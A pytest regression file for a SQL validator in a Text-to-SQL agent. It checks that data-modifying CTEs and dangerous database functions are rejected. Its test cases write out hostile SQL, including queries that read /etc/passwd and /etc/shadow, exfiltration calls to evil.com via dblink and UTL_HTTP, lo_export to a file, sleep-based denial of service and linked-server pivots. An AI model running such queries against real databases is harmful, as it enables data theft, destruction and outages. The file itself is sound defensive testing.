"""Regression tests for the two critical/high findings from the enterprise
security audit -- both verified live against this repo's validator *before*
this hardening existed, and both closed by the same change to
`agent/sql_validator.py`:

1. **Critical**: a data-modifying CTE (`WITH x AS (DELETE ... RETURNING *)
   SELECT * FROM x`) has an ordinary `exp.Select` root node, so a
   root-type-only allowlist check accepted it as valid -- a full bypass of
   the "SELECT-only" security gate. Closed by a full-tree walk for
   write/DDL-shaped nodes, not just the root.
2. **High**: known-dangerous functions/table-valued-functions (`pg_sleep`,
   `LOAD_FILE`, `UTL_HTTP.REQUEST`, `OPENQUERY`, ...) parse as an ordinary
   function call inside a syntactically valid SELECT, so they also passed
   the root-type-only check. Closed by a dangerous-function denylist,
   checked both structurally (AST call-node name) and, for dialect-qualified
   calls the AST check alone can miss, via a raw-text fallback.

Kept separate from `tests/test_sql_validator.py` (that file's own docstring
calls itself "the most important tests in the project," focused on the
original allowlist) and from `tests/test_adversarial_input.py` (that file
covers the input/data-poisoning layer, not the validator's own bypass
surface) -- this file is specifically the audit's regression evidence.
"""

from __future__ import annotations

import pytest

from agent.sql_validator import SAFETY_VIOLATION_TYPES, validate_sql


class TestDataModifyingCteIsRejected:
    """The critical finding: a writable CTE must never pass validation,
    regardless of dialect or which DML statement is embedded."""

    @pytest.mark.parametrize(
        "sql",
        [
            "WITH deleted AS (DELETE FROM customers WHERE 1=1 RETURNING *) SELECT * FROM deleted",
            "WITH updated AS (UPDATE customers SET email='pwned@evil.com' RETURNING *) "
            "SELECT * FROM updated",
            "WITH inserted AS (INSERT INTO customers (id) VALUES (1) RETURNING *) "
            "SELECT * FROM inserted",
            # Nested two levels deep (a CTE referencing another writable CTE) --
            # confirms the walk isn't only one level of recursion.
            "WITH d AS (DELETE FROM orders RETURNING *), "
            "wrapped AS (SELECT * FROM d) SELECT * FROM wrapped",
        ],
    )
    def test_writable_cte_or_subquery_is_rejected(self, sql):
        result = validate_sql(sql, dialect="postgres")
        assert not result.is_valid
        assert result.violation_type == "embedded_write"
        assert result.violation_type in SAFETY_VIOLATION_TYPES

    def test_ordinary_read_only_cte_is_still_accepted(self):
        """Sanity check against a false positive: a normal, non-writable
        CTE (the common, legitimate case) must keep working exactly as
        before this hardening."""
        sql = (
            "WITH regional_totals AS ("
            "SELECT region, COUNT(*) AS n FROM customers GROUP BY region"
            ") SELECT * FROM regional_totals WHERE n > 1"
        )
        result = validate_sql(sql)
        assert result.is_valid

    def test_nested_write_error_message_names_the_operation(self):
        result = validate_sql(
            "WITH d AS (DELETE FROM customers RETURNING *) SELECT * FROM d", dialect="postgres"
        )
        assert result.error is not None
        assert "Delete" in result.error


class TestDangerousFunctionsAreRejected:
    """The high-severity finding: functions capable of DoS, filesystem
    disclosure, SSRF, or a linked-server pivot must never pass validation,
    even though each of these is a syntactically ordinary SELECT."""

    @pytest.mark.parametrize(
        "dialect,sql",
        [
            ("postgres", "SELECT pg_sleep(50)"),
            ("postgres", "SELECT pg_read_file('/etc/passwd')"),
            ("postgres", "SELECT pg_read_binary_file('/etc/shadow')"),
            ("postgres", "SELECT lo_export(12345, '/tmp/exfil.bin')"),
            ("postgres", "SELECT * FROM dblink('host=evil.com', 'SELECT 1') AS t(x int)"),
            ("mysql", "SELECT SLEEP(50)"),
            ("mysql", "SELECT BENCHMARK(1000000000, MD5('x'))"),
            ("mysql", "SELECT LOAD_FILE('/etc/passwd')"),
            ("oracle", "SELECT UTL_HTTP.REQUEST('http://evil.com/exfil') FROM dual"),
            ("oracle", "SELECT dbms_lock.sleep(10) FROM dual"),
            ("tsql", "SELECT * FROM OPENQUERY(LinkedServer, 'SELECT 1')"),
            ("tsql", "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'evil') .. sys.tables"),
        ],
    )
    def test_dangerous_function_call_is_rejected(self, dialect, sql):
        result = validate_sql(sql, dialect=dialect)
        assert not result.is_valid, f"expected rejection for: {sql}"
        assert result.violation_type == "dangerous_function"
        assert result.violation_type in SAFETY_VIOLATION_TYPES

    def test_ordinary_aggregate_functions_still_accepted(self):
        """Sanity check: the denylist must not sweep up everyday functions."""
        sql = "SELECT COUNT(*), SUM(amount), AVG(amount), MAX(amount) FROM orders"
        result = validate_sql(sql)
        assert result.is_valid

    @pytest.mark.parametrize(
        "column_name",
        ["sleep_duration_minutes", "utl_http_helper_flag", "benchmark_score"],
    )
    def test_column_name_merely_containing_a_dangerous_word_is_not_flagged(self, column_name):
        """A column whose name happens to contain a denylisted word, but
        isn't called as a function, must not be rejected -- the word-boundary
        + open-paren requirement in the raw-text fallback exists for exactly
        this case."""
        result = validate_sql(f"SELECT {column_name} FROM some_table")
        assert result.is_valid

    def test_error_message_names_the_function(self):
        result = validate_sql("SELECT pg_sleep(50)", dialect="postgres")
        assert result.error is not None
        assert "pg_sleep" in result.error.lower()


class TestMalformedInputFailsCleanlyInsteadOfCrashing:
    """Regression coverage for a real crash discovered while authoring the
    Text-to-SQL benchmark: a malformed LLM response (an off-topic-sentinel
    fragment mixed with prose, from a question that slipped past
    `agent/input_guard.py`) failed at sqlglot's *tokenizer* stage -- a
    `TokenError`, not a `ParseError` -- which the validator's original
    `except ParseError` did not catch, crashing the entire agent run with an
    unhandled exception instead of returning an ordinary, retryable
    "parse_error" `ValidationResult`. Fixed by catching the shared
    `SqlglotError` base instead of the narrower `ParseError`."""

    def test_unterminated_string_literal_fails_cleanly(self):
        """The exact tokenizer-breaking shape found live: an unterminated
        quoted string (a `TokenError`, not a `ParseError`)."""
        result = validate_sql(" this database), respond with exactly: NOT_A_QUER", dialect="tsql")
        assert result.is_valid is False
        assert result.violation_type == "parse_error"
        assert result.error is not None

    @pytest.mark.parametrize(
        "malformed",
        [
            "SELECT 'unterminated string FROM t",
            "SELECT `unterminated backtick FROM t",
            'SELECT "unterminated quoted identifier FROM t',
        ],
    )
    def test_various_unterminated_literals_fail_cleanly(self, malformed):
        result = validate_sql(malformed)
        assert result.is_valid is False
        assert result.violation_type in ("parse_error", "empty")
